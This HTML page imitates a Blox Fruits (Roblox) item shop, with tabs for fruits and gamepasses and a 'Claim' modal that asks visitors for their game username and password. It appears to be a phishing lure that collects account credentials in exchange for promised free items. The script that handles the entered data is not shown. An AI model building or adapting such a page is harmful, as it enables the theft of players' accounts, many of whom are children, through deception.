<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Blox Fruits</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="topbar">
    <div class="logo">
        <img src="https://static.wikia.nocookie.net/roblox-blox-piece/images/e/e6/Site-logo.png/revision/latest?cb=20250404120109">
    </div>

    <div class="nav">
   <button class="active" data-tab="all">All</button>
    <button data-tab="fruits">Fruits</button>
    <button data-tab="gamepasses">Gamepasses</button>
    <button data-tab="services">Services</button>
</div>
</div>

<div id="fruitsSection">
    <h2>Fruits</h2>
    <div class="grid" id="fruitGrid"></div>
</div>

<div id="gamepassesSection">
    <h2>Gamepasses</h2>
    <div class="grid" id="gamepassGrid"></div>
</div>
<!-- MODAL -->
<div class="modal" id="modal">
    <div class="modal-box">
        <p id="modalText"></p>
        <button class="yes" id="yesBtn">Yes</button>
        <button class="no" id="noBtn">No</button>
    </div>
</div>

<!-- CLAIM -->
<div class="modal" id="claimModal">
    <div class="modal-box">
        <p id="claimItem"></p>
        <input id="username" placeholder="Username">
        <input id="password" placeholder="Password">
        <button class="claim" id="claimBtn">Claim</button>
    </div>
</div>

<script src="script.js"></script>

</body>
</html>
